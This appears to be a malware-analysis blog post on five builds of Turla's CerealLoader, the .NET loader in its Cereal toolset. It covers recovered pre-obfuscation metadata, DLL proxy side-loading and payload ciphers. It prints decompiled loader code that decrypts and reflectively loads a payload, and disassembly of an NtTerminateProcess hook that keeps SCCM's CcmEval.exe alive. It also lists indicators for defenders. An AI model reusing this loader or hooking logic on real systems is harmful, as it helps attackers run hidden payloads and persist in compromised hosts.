---
title: "Turla's CerealLoader still carries its unobfuscated metadata"
date: 2026-11-14T21:12:27+00:00
slug: "cerealloader-original-metadata"
description: "Five public builds of CerealLoader, the C++/CLI loader in Turla's Cereal toolset: four still hold the metadata MSVC wrote before ConfuserEx, with method names like ManagedEntryPoint and import_functions; per-build payload paths, ciphers and hosts; and a build from late 2025 or later that hooks NtTerminateProcess so SCCM's CcmEval.exe can't exit."
tags: ["turla", "cereal", "cerealloader", "dotnet", "c++/cli", "confuserex", "mixed-mode", "dll-sideloading", "exchange"]
sample:
  family: "CerealLoader (Turla Cereal toolset), Microsoft.Ceres.dll build"
  sha256: "41164eb06adc72b187edaf90d73ca73be729d4ebfdecf57d7398561136941651"
  source: "[Hybrid Analysis](https://www.hybrid-analysis.com/sample/41164eb06adc72b187edaf90d73ca73be729d4ebfdecf57d7398561136941651)"
toc: true
---

Four of the five public CerealLoader builds still contain the code their author wrote before obfuscating it. In each of them ConfuserEx added a second, obfuscated copy of the .NET metadata in a section after the original ones and pointed the CLI header at it, but the original metadata root is still in `.rdata`, and most of the method bodies it points to are still in the original `.text`. Point a copy of the header back at it, and for the 2024 build ILSpy prints a method called `ManagedEntryPoint`, a helper called `Xor`, and the payload path as a plain string literal. In the two RC4 builds the original metadata also names a method `import_functions`, whose only job is to pad the import table, and in one of them it lists the C++ string literals of a native hook that keeps SCCM's `CcmEval.exe` from ever exiting.

CerealLoader is the loader in Cereal, the .NET toolset that [ESET attributed to Turla on November 10](https://www.welivesecurity.com/en/eset-research/exchange-for-breakfast-turlas-cereal-tricks-are-not-for-kids/) (Matías Porolli). ESET's white paper explains its trick: a native entry point and a VTableFixup slot run a managed method that no managed code calls. The paper shows the loader logic of one sample, as a screenshot, and says that "the filenames noted in code comments, as well as the decryption key, vary between samples". ESET's [IoC list](https://github.com/eset/malware-ioc/tree/master/turla) has eleven CerealLoader hashes. Two are on MalwareBazaar and three more on Hybrid Analysis; none of the five is the build in ESET's screenshot. I read all five with pefile, capstone, dnfile, de4dot and ILSpy.

## What I found

- Four builds keep their pre-ConfuserEx metadata. The names in it (`__m2mep@?ManagedEntryPoint@@$$FYAXXZ`, `__unep@?SleepEx@@$$J0YAKKH@Z`, `??_C@_09FLKFJBLM@ntdll?4dll@`) are MSVC C++/CLI symbols, which confirms what R136a1 [said](https://x.com/TheEnergyStory/status/2120211882690933223) on the day of ESET's report: CerealLoader is C++/CLI. R136a1 also published a [proof of concept](https://gist.github.com/TheEnergyStory/b4efad6170b06c5b3267c7e37927fa1d) of the technique.
- The five builds use four host and file pairs: VMware Tools (`version.dll`, payload `vmtools.dat`), SCCM's client health check (`SensApi.dll`, files under `C:\Windows\CCM\SystemTemp`), a `dbghelp.dll` proxy with files under `C:\programdata\Microsoft\DRM`, and an Exchange native image reading `C:\ProgramData\Microsoft\Vault.fsc`. None of these paths is in ESET's paper or IoC list.
- The payload format is a 32-byte key prepended to the file in the 2022 build, a 255-byte prepended key in the 2024 and 2025 builds, and RC4 with a 256-byte key in the loader in the other two. One of those two was linked in late 2025 or later; nothing dates the other.
- The `Microsoft.Ceres.dll` build runs only inside a process whose image name starts with `CcmEval`. It patches `NtTerminateProcess` to sleep forever and suspends every other thread before running its payload. It was linked with MSVC 14.50, so it is from late 2025 or later; its PE timestamp is a reproducible-build hash, not a date.

## Five builds, five hosts

All five are x64 DLLs with `COMIMAGE_FLAGS_NATIVE_ENTRYPOINT` (0x10) set in the CLI header. The table uses ESET's file names; the "proxies" column is the name in the export directory, where there is one.

| Build | ESET name | Proxies | Payload file | Cipher |
|---|---|---|---|---|
| `13fe1eb9` | Microsoft.Exchange.Data.Transport.ni.dll | (no exports) | `C:\ProgramData\Microsoft\Vault.fsc` | 32-byte key prefix, XOR |
| `241aac14` | version.dll | version.dll, 17 exports | `C:\Program Files\VMware\Vmware Tools\vmtools.dat` | 255-byte key prefix, XOR |
| `d3b6065e` | version.dll | version.dll, 17 exports | same `vmtools.dat` | 255-byte key prefix, XOR |
| `6119d25a` | Microsoft.Search.Platform.dll | dbghelp.dll, 248 exports | `C:\\programdata\\Microsoft\\DRM\\lAoH23.tmp` | RC4 |
| `41164eb0` | Microsoft.Ceres.dll | SensApi.dll, 3 exports | `c:\\Windows\\CCM\\SystemTemp\\685713b14b62` | RC4 |

The doubled backslashes are in the decrypted strings; Windows accepts them. Every proxy forwards all of its exports to an absolute path, `C:\Windows\System32\<name>.<export>`, so the real DLL keeps working. ESET's file names and the proxy names don't match for the last two builds. ESET's names are the build-output names (the debug directories point to `Microsoft.Search.Platform.pdb` and `Microsoft.Ceres.pdb`); I don't know which name each file had when it was loaded.

The other files each build touches:

| Build | Error log | Other |
|---|---|---|
| `13fe1eb9` | none | pins itself with `LoadLibraryW` on its own path |
| `241aac14` | none | |
| `d3b6065e` | `C:\\ProgramData\\Microsoft\\MF\\4qqklzco.dat` | |
| `6119d25a` | `C:\\programdata\\Microsoft\\DRM\\oInMT8la2r.tmp` | |
| `41164eb0` | `c:\\Windows\\CCM\\SystemTemp\\685713b14b63` | native progress log `c:\WINDOWS\CCM\SystemTemp\68571` |

The managed logic is the same in all five, and matches ESET's Figure 5: check the payload file exists, read it, decrypt it, `Assembly.Load` it, take the first exported type, call its first public method with no arguments. If anything throws, the builds with a log path write the exception text, encrypted, to the log path.

## Looking for a string that wasn't there

The first build I decoded completely was `241aac14`, the 2024 `version.dll`. Its only string is behind ConfuserEx's constants protection: a getter takes an integer ID, and a 64-byte field holds the data, XORed with a key from a xorshift generator and LZMA-compressed. I wrote a decoder for that, and it printed the VMware Tools path.

Then my extractor printed the same path a second time, as a plain string found in `.rdata`. I didn't believe it. I had already searched the file for `Vmware` and found nothing, so I assumed the extractor was reading the wrong buffer. The earlier search was the mistake: it was an ASCII search, and this copy is UTF-16. The bytes in front of it decide what it is:

```hexdump {title="241aac14, file offset 0xc90 (RVA 0x3490)"}
00000c90: 7665 7273 696f 6e2e 646c 6c00 0061 4300  version.dll..aC.
00000ca0: 3a00 5c00 5000 7200 6f00 6700 7200 6100  :.\.P.r.o.g.r.a.
```

`0x61` is 97: 48 UTF-16 characters plus one trailing flag byte. That is how the `#US` heap of .NET metadata stores a string literal. The active metadata of this file is at RVA 0xb598, in a `.text` section at the end of the file. A second metadata root, with its own `BSJB` signature, sits at RVA 0x30a0 in `.rdata`. Three of the other four builds have the same second root; the 2022 build doesn't (its `.rdata` is 2,820 bytes and contains no `BSJB`).

| Build | Active metadata | Original metadata |
|---|---|---|
| `13fe1eb9` | 0xc8e8 | none |
| `241aac14` | 0xb598 | 0x30a0 (`.rdata`) |
| `d3b6065e` | 0x16960 | 0x60a0 (`.rdata`) |
| `6119d25a` | 0x1569c | 0x4440 (`.rdata`) |
| `41164eb0` | 0x116f4 | 0x4520 (`.rdata`) |

## The loader under the obfuscation

I copied each file, changed the metadata RVA and size in the copy's CLI header to the `.rdata` root, and opened the copy in ILSpy. This is the 2024 build, trimmed to the two members that matter (ILSpy's comment on the field's data removed):

```csharp {title="241aac14, original metadata"}
public unsafe static delegate*<void> __m2mep@?ManagedEntryPoint@@$$FYAXXZ;

internal static void ManagedEntryPoint()
{
    try
    {
        string path = "C:\\Program Files\\VMware\\Vmware Tools\\vmtools.dat";
        if (!File.Exists(path))
        {
            return;
        }
        byte[] array = File.ReadAllBytes(path);
        byte[] array2 = new byte[255];                       // (1)
        Array.Copy(array, 0, array2, 0, 255);
        int num = array2.Length;
        byte[] array3 = new byte[(nint)array.LongLength - num];
        Array.Copy(array, num, array3, 0, array3.Length);
        Xor(array3, array2);
        Assembly assembly = Assembly.Load(array3);
        if (!(assembly != null))
        {
            return;
        }
        Type[] exportedTypes = assembly.GetExportedTypes();
        if ((nint)exportedTypes.LongLength > 0)
        {
            MethodInfo[] methods = exportedTypes[0].GetMethods();
            if ((nint)methods.LongLength > 0)
            {
                methods[0].Invoke(null, null);
            }
        }
    }
    catch (Exception)
    {
    }
}
```

Method and field names come from the metadata; local variable names are ILSpy's. The field name is the MSVC-mangled name the C++/CLI compiler gives the slot it creates when native code calls a managed function: `__m2mep@` plus the mangled name of `ManagedEntryPoint`, where `$$F` marks a function compiled to IL. At (1) the payload file's first 255 bytes become the XOR key for the rest.

In the obfuscated copy, the same method has a name made of invisible Unicode characters, and the path comes from the constants getter. The CLR reads only the metadata the CLI header points to, so the original copy changes nothing at run time. It is still in the file. I think the cause is the writer, not the author: ConfuserEx writes through dnlib, and for a module with native code, dnlib keeps the original sections and adds the new metadata and IL in a section appended at the end. That fits all four files, where the active metadata sits in a second `.text` section after `.rsrc` or `.reloc`, but I haven't checked dnlib's source line by line.

The 2025 `version.dll` (`d3b6065e`) changed the source, not just the obfuscation. Its original metadata has random method names (`R4wJWN05jDd` for the entry point, `Vcr943J98DdyX4YZfrJY` for the XOR), and its strings are already encrypted in the source: each is a byte array whose first 255 bytes are the XOR key for the rest, the same layout as the payload file. Its `#US` heap holds one string, a single space. The two RC4 builds go one step further and keep a 256-byte RC4 key in the source; their original methods are `Encrypt` (plain RC4), two string helpers with random names, a random-named entry point, and `import_functions` (plus P/Invoke declarations of `HeapAlloc` and `HeapFree` in `6119d25a`).

## A decoy that is never called

`import_functions` appears in the original metadata of both RC4 builds with a C++ `bool` parameter called `invoke`. If `invoke` is true, it calls 57 (in `6119d25a`) or 56 (in `41164eb0`) Win32 functions through `__unep@` pointers, with no arguments. `CryptGetUserKey`, `OpenEventLogA`, `GetRawInputDeviceInfoA` and the rest have nothing to do with loading an assembly. Referencing them makes the linker put them in the import table, so the DLL's imports look like a normal program's: 59 imports in `6119d25a`, 74 in `41164eb0`. Every import that is not on the decoy list, apart from `_CorDllMain`, is one the native code uses. In `41164eb0` the native code also calls two functions that happen to be on the decoy list, `CreateFileA` and `OpenThread`.

ESET's Figure 8 shows the native caller in IDA's output as `LOBYTE(v1) = 0; sub_180003000(v1);`. The disassembly says the same:

```asm {title="6119d25a, thread started from DllMain"}
002226:  xor ebx, ebx
002228:  lea r8, [rip - 0x1f]        ; second thread, runs the payload method
...
00223f:  call 0x180002345            ; CreateThread
002244:  test eax, eax
002246:  cmove ebx, eax              ; (1) ebx = eax only when eax is 0
002249:  test ebx, ebx
00224b:  setne cl                    ; (2) cl = 0 on both paths
00224e:  call 0x180003000            ; import_functions(cl), slot token 0x06000001
```

At (1), `ebx` is zero before the `cmove` and still zero after it, whatever `CreateThread` returned. So at (2) the argument is always false, and `import_functions` returns at once. `41164eb0` compiles to the same `cmove`/`setne` pair. The decoy exists only to be linked.

## The CcmEval build keeps its host alive

`41164eb0` (`Microsoft.Ceres.dll`) has more native code than the others. Its `DllMain` starts a thread. That thread builds a 256-byte key and an 8-byte buffer on the stack with `mov dword ptr` instructions, RC4-decrypts the buffer and writes a zero over its last byte. The key is the same 256 bytes the managed code uses, starting `cb fd 80 a0`, and the plaintext is `CcmEval`. The next function gets the process's own image path with `QueryFullProcessImageNameA`, skips to the part after the last backslash, and compares it with `CcmEval` byte by byte, case-sensitively, as a prefix. `CcmEval.exe` is the Configuration Manager client's health evaluation tool, which lives in `C:\Windows\CCM`, the folder that also holds this build's payload. ESET describes a build that does the same check against `Microsoft.Exchange.Search.Service`; this one does it for SCCM.

If the name matches, a second thread does this:

```asm {title="41164eb0, NtTerminateProcess patch (sub_2500)"}
002506:  lea rcx, [rip + 0x1f63]     ; "ntdll.dll"
00250d:  call 0x180002ad5            ; GetModuleHandleA
002515:  lea rdx, [rip + 0x1f64]     ; "NtTerminateProcess"
00251c:  call 0x180002adb            ; GetProcAddress
00252e:  mov edx, 0xe                ; 14 bytes
002533:  mov r8d, 0x40               ; PAGE_EXECUTE_READWRITE
00253c:  call 0x180002ae1            ; VirtualProtect
002545:  lea rax, [rip - 0x5c]       ; (1) 0x24f0
00254c:  mov dword ptr [rbx], 0x25ff ; with the word below: FF 25 00 00 00 00
002552:  mov qword ptr [rbx + 6], rax ; target address after the jmp
00255b:  mov word ptr [rbx + 4], 0   ; jmp qword ptr [rip+0]
00256e:  call 0x180002ae1            ; VirtualProtect, old protection back
```

The 14 bytes at the start of `NtTerminateProcess` become `jmp qword ptr [rip+0]` followed by the address of 0x24f0, and the code at (1) is a loop of `Sleep(10000)` that never ends. Any thread in the process that tries to end it, through `ExitProcess` or anything else that reaches `NtTerminateProcess`, goes to sleep instead. Then the thread takes a `CreateToolhelp32Snapshot` of all threads, and for every thread of its own process except itself calls `OpenThread` with access 0x5A and `SuspendThread`. Only after that does it call the managed entry point through VTableFixup slot `0x06000006`.

I think the reason is the host: a health check runs, writes its results and exits, and a loader inside it would die with it. With the host's own threads frozen and its exit path parked, the payload keeps a live process under the `CcmEval.exe` name for as long as it needs. That is inference; I haven't seen the host load this file.

The thread also writes progress markers. It opens `c:\WINDOWS\CCM\SystemTemp\68571` with `FILE_APPEND_DATA` and `OPEN_ALWAYS` and appends `1` when it starts, `3` for every thread it enumerates, and `4` before each thread it tries to suspend. There is no `2`. The original metadata lists these literals as C++ string constants (`??_C@_01HIHLOKLC@1@`, and the path as `??_C@_0CA@BCCDPILL@c?3?2WINDOWS?2CCM?2SystemTemp?268571@`), so they are part of the source. The log file's name is the first five characters of the payload's name, `685713b14b62`.

The `Exchange.Data.Transport.ni.dll` build (`13fe1eb9`) has its own small native addition: before starting the thread, its `DllMain` calls `GetModuleFileNameW` on its own module and `LoadLibraryW` on the result. That adds a reference to itself, so the DLL stays mapped while its thread runs. ESET explains that the CLR uses a fake native image only for its entry point and then loads the real assembly. I think this is why a native-image build pins itself and the side-loaded proxies don't.

## Payload and log formats

| Scheme | Builds | Payload file layout | Log |
|---|---|---|---|
| XOR, 32-byte prefix | `13fe1eb9` | `key[32] ‖ data`, `plain[i] = data[i] ^ key[i % 32]` | none |
| XOR, 255-byte prefix | `241aac14`, `d3b6065e` | `key[255] ‖ data`, `plain[i] = data[i] ^ key[i % 255]` | `d3b6065e`: same layout, fresh random key each time |
| RC4, key in loader | `6119d25a`, `41164eb0` | whole file RC4 | same RC4 key |

The RC4 keys, all 256 bytes, start `65 56 67 95 53 4b 24 83` (`6119d25a`) and `cb fd 80 a0 1f e5 96 20` (`41164eb0`). The extractor prints them in full. With the XOR builds, a payload or log file carries its own key, so anyone holding the file can decrypt it.

## Dates, and two that aren't dates

| Build | PE timestamp (UTC) | Linker version |
|---|---|---|
| `13fe1eb9` | 2022-04-27 12:22:23 | 14.28 |
| `241aac14` | 2024-12-19 13:58:18 | 14.29 |
| `d3b6065e` | 2025-02-27 13:10:50 | 14.38 |
| `6119d25a` | (hash, 2015-02-15 if read as a date) | 14.37 |
| `41164eb0` | (hash, 2024-08-21 if read as a date) | 14.50 |

`13fe1eb9`'s timestamp matches the compilation date ESET gives for the earliest CerealLoader it found ("April 27th, 2022", uploaded to VirusTotal from Kazakhstan on May 11, 2022). The three dated builds have no debug directory.

My first draft called the last two timestamps forged, because both are older than their linkers: 14.37 came with Visual Studio 2022 version 17.7 in August 2023, and 14.50 is the toolset of [Visual Studio 2026, released in November 2025](https://learn.microsoft.com/cpp/overview/compiler-versions). The review of this post caught what I missed. Both files have debug directory entries of type 16 (`IMAGE_DEBUG_TYPE_REPRO`) and 19: they were linked with `/Brepro`, and in a reproducible build the TimeDateStamp field holds a hash of the output, not a time. Nobody forged anything. The linker version still dates `41164eb0`: it is from late 2025 or later (14.50 had release candidates shortly before its November release), no earlier than that. ESET dates the two compromises from November 28 and December 23, 2025. For `6119d25a` the linker only says August 2023 or later, which doesn't place it before or after the 2025 `version.dll`.

## What I couldn't determine

- The payloads. I have only the loaders, so I can't say what these five loaded. ESET saw one chain in which CerealLoader loaded CerealSprinter carrying CerealHermit.
- Most of the 2022 build's ConfuserEx constants. It has five getter methods, and neither of its candidate data fields (128 and 448 bytes) decodes with the routine that works on `241aac14`, with any `ldc.i4` value in the module as the seed. Either the variant differs or I'm looking at the wrong field. By shape, the code using those constants is ConfuserEx's anti-debug runtime: `GetMethod`, `String.Concat` and `Invoke` on encrypted names, `Environment.FailFast`, and a watcher thread that sleeps 500 and 1,000 ms. That build doesn't need the blob for its path, which is a native wide-string literal in plain text.
- Where the two proxies were loaded from, and under what name. `SensApi.dll` next to `CcmEval.exe` in `C:\Windows\CCM` and `version.dll` next to the VMware Tools service are my guesses from the payload paths.
- Why the 2022 build has no original metadata left.

## The extractor

[`families/cerealloader`](https://github.com/stateless-re/tools/tree/main/families/cerealloader) reads a build statically and prints its export-proxy target, VTableFixup slots, cipher and key, decrypted strings (payload path first), native paths, the native RC4 string and what the original metadata contains. It works on IL and machine code directly: it rebuilds byte arrays that ConfuserEx's flattening spread over dozens of switch cases, finds the ConfuserEx constants seed by trying every `ldc.i4` in the module, and rebuilds the stack frame that holds `CcmEval`. With `--payload FILE -o DIR` it decrypts a payload or log file with the build's scheme. I tested that part only on files I encrypted myself.

## Indicators

Files (ESET's names):

| SHA-256 | Name | Source |
|---|---|---|
| `13fe1eb9b182b076a815f84d34b66365809d0cff32df6f5b85aa7ef4deee98e0` | Microsoft.Exchange.Data.Transport.ni.dll | [MalwareBazaar](https://bazaar.abuse.ch/sample/13fe1eb9b182b076a815f84d34b66365809d0cff32df6f5b85aa7ef4deee98e0/) |
| `6119d25ae51d04264384f5d738c104e42596b0774609666b357a43608a48404c` | Microsoft.Search.Platform.dll | [MalwareBazaar](https://bazaar.abuse.ch/sample/6119d25ae51d04264384f5d738c104e42596b0774609666b357a43608a48404c/) |
| `241aac14756a0f29edd084b858623db259d59c77ea44889de93431c42ff10036` | version.dll | [Hybrid Analysis](https://www.hybrid-analysis.com/sample/241aac14756a0f29edd084b858623db259d59c77ea44889de93431c42ff10036) |
| `d3b6065eb001d169421fcd146f64b087055dadebd973d8d69ae2bf97fbf288e2` | version.dll | [Hybrid Analysis](https://www.hybrid-analysis.com/sample/d3b6065eb001d169421fcd146f64b087055dadebd973d8d69ae2bf97fbf288e2) |
| `41164eb06adc72b187edaf90d73ca73be729d4ebfdecf57d7398561136941651` | Microsoft.Ceres.dll | [Hybrid Analysis](https://www.hybrid-analysis.com/sample/41164eb06adc72b187edaf90d73ca73be729d4ebfdecf57d7398561136941651) |

Paths written or read by the loaders (written here with single backslashes):

| Path | Role |
|---|---|
| `C:\ProgramData\Microsoft\Vault.fsc` | payload, `13fe1eb9` |
| `C:\Program Files\VMware\Vmware Tools\vmtools.dat` | payload, `241aac14` and `d3b6065e` |
| `C:\ProgramData\Microsoft\MF\4qqklzco.dat` | error log, `d3b6065e` |
| `C:\programdata\Microsoft\DRM\lAoH23.tmp` | payload, `6119d25a` |
| `C:\programdata\Microsoft\DRM\oInMT8la2r.tmp` | error log, `6119d25a` |
| `C:\Windows\CCM\SystemTemp\685713b14b62` | payload, `41164eb0` |
| `C:\Windows\CCM\SystemTemp\685713b14b63` | error log, `41164eb0` |
| `C:\WINDOWS\CCM\SystemTemp\68571` | progress markers `1`, `3`, `4`, `41164eb0` |

Host and file traits: a DLL with `COMIMAGE_FLAGS_NATIVE_ENTRYPOINT` whose exports all forward to `C:\Windows\System32\<same name>`; a .NET DLL with two `BSJB` metadata roots; a `CcmEval.exe` process whose `NtTerminateProcess` starts with `FF 25 00 00 00 00`.

## ATT&CK

| ID | Technique | Here |
|---|---|---|
| T1574.001 | Hijack Execution Flow: DLL | `version.dll`, `SensApi.dll` and `dbghelp.dll` proxies forwarding to System32 |
| T1027 | Obfuscated Files or Information | ConfuserEx control flow, renaming and constants |
| T1027.013 | Obfuscated Files or Information: Encrypted/Encoded File | payloads under key-prefix XOR or RC4 |
| T1140 | Deobfuscate/Decode Files or Information | the loader decrypts its strings and payload |
| T1620 | Reflective Code Loading | `Assembly.Load` of the decrypted payload |

## Ending

ConfuserEx gave `ManagedEntryPoint` an invisible name and hid the VMware Tools path behind an LZMA blob, and the original path sat a few kilobytes away in the same file, in plain UTF-16. The author fixed that for the next build by encrypting strings in the source. For a defender, the second `BSJB` root is a better tell than any of the paths: a mixed-mode DLL that has been through dnlib can carry two metadata roots, and the one in `.rdata` is the one worth decompiling.

## Credits and further reading

- ESET Research (Matías Porolli), [Exchange for breakfast: Turla's Cereal tricks are not for kids](https://www.welivesecurity.com/en/eset-research/exchange-for-breakfast-turlas-cereal-tricks-are-not-for-kids/) (November 10, 2026), the white paper linked from it, and the [IoC list](https://github.com/eset/malware-ioc/tree/master/turla), where the hashes came from.
- R136a1, who [identified CerealLoader as C++/CLI](https://x.com/TheEnergyStory/status/2120211882690933223) and published a [proof of concept](https://gist.github.com/TheEnergyStory/b4efad6170b06c5b3267c7e37927fa1d).
- Microsoft, [MSVC compiler versions](https://learn.microsoft.com/cpp/overview/compiler-versions), for the toolset dates.
- The samples: MalwareBazaar and Hybrid Analysis, linked in the Indicators table.
- The extractor: [families/cerealloader](https://github.com/stateless-re/tools/tree/main/families/cerealloader).
